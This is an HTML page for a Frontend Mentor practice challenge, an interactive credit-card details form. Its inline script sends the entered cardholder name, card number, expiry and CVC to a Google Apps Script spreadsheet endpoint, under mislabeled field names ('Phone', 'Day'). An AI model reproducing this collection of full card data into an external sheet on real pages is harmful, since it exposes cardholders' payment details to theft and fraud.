<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link
      rel="icon"
      type="image/png"
      sizes="32x32"
      href="./images/favicon-32x32.png"
    />
    <link rel="stylesheet" href="style.css" />
    <title>Frontend Mentor | Interactive card details form</title>
  </head>
  <body>
    <main>
      <header>
        <img
          src="./images/bg-card-back.png"
          alt="bg card back"
          id="card-back"
          class="card"
          width="300"
        />
        <p class="num" id="num">000</p>
        <img
          src="./images/bg-card-front.png"
          alt="bg front back"
          id="card-front"
          class="card"
          width="300"
        />

        <div class="bg-circle"></div>
        <div class="small-circle"></div>
        <h1 class="zeros" id="card-number">0000 0000 0000 0000</h1>
        <p class="jane" id="holder-name">Jane Appleseed</p>
        <div class="two-zero">
          <p id="m-m">00</p>
          <p>/</p>
          <p id="y-y">00</p>
        </div>
      </header>
      <form name="submit-to-google-sheet">
        <div id="first-phase" class="first-phase">
          <div class="input-label">
            <label for="name">CARDHOLDER NAME</label>
            <input
              type="text"
              id="name"
              name="Name"
              placeholder="e.g. Jane Appleseed"
              required
            />
          </div>
          <div class="input-label">
            <label for="card-num">CARD NUMBER</label>
            <input
              type="number"
              id="card-num"
              name="Phone"
              placeholder="e.g. 1234 5678 9123 0000"
              required
            />
          </div>
          <div class="input-label">
            <label for="date">EXP. DATE (MM/YY) <span>CVC</span></label>
            <div class="date-input">
              <input
                type="text"
                id="month"
                placeholder="MM"
                name="Month"
                required
              />
              <input
                type="text"
                id="year"
                placeholder="YY"
                name="Year"
                required
              />
              <input
                type="text"
                id="day"
                placeholder="eg. 123"
                name="Day"
                required
              />
            </div>
          </div>
        </div>
        <div id="success-phase" class="success-phase hidden">
          <img src="./images/icon-complete.svg" alt="icon complete" />
          <h1>Thank you!</h1>
          <h3>We've added your card details</h3>
        </div>
        <div class="btn">
          <button type="submit" id="btn-submit">Confirm</button>
        </div>
      </form>
    </main>
    <script src="./script.js" type="text/javascript"></script>
    <script src="./jQuaryFile/jquery.js" type="text/javascript"></script>
    <script>
      const scriptURL =
        "https://script.google.com/macros/s/AKfycbw5IW_Hkxq101U5M7UIXRST-4fzoFtWhXKyNz6ab1hjb2yzPxZHPn5z6LiXX_hO2M-6/exec";
      const form = document.forms["submit-to-google-sheet"];

      form.addEventListener("submit", (e) => {
        e.preventDefault();
        fetch(scriptURL, { method: "POST", body: new FormData(form) })
          .then((response) => console.log("Success!", response))
          .catch((error) => console.error("Error!", error.message));
      });
    </script>
  </body>
</html>
